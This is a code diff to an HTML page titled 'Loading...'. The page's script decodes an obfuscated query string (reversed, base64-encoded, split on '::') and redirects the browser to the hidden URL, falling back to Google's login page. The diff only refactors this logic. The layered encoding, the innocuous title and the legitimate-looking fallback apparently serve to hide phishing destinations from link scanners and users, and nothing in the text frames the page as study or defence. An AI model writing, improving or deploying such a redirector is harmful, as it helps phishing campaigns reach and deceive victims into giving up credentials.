@@ -5,19 +5,30 @@
   <title>Loading...</title>
   <script>
     window.onload = function () {
-      const reverse = s => s.split('').reverse().join('');
-      const isUrl = u => {
-        try { new URL(u); return true; } catch { return false; }
+      const reverse = str => [...str].reverse().join('');
+
+      const isUrl = str => {
+        try {
+          const url = new URL(str);
+          return url.protocol === "http:" || url.protocol === "https:";
+        } catch {
+          return false;
+        }
       };
+
+      const fallback = 'https://www.google.com/login';
       const query = window.location.search.slice(1);
+
       try {
-        const b64 = reverse(decodeURIComponent(query));
-        const raw = atob(b64);
-        const parts = raw.includes("::") ? raw.split("::")[1] : raw;
-        const finalUrl = decodeURIComponent(parts);
-        window.location.href = isUrl(finalUrl) ? finalUrl : 'https://www.google.com/login';
+        const reversed = decodeURIComponent(query);
+        const base64 = reverse(reversed);
+        const decoded = atob(base64);
+        const payload = decoded.includes("::") ? decoded.split("::")[1] : decoded;
+        const finalUrl = decodeURIComponent(payload);
+
+        window.location.href = isUrl(finalUrl) ? finalUrl : fallback;
       } catch (e) {
-        window.location.href = 'https://www.google.com/login';
+        window.location.href = fallback;
       }
     };
   </script>
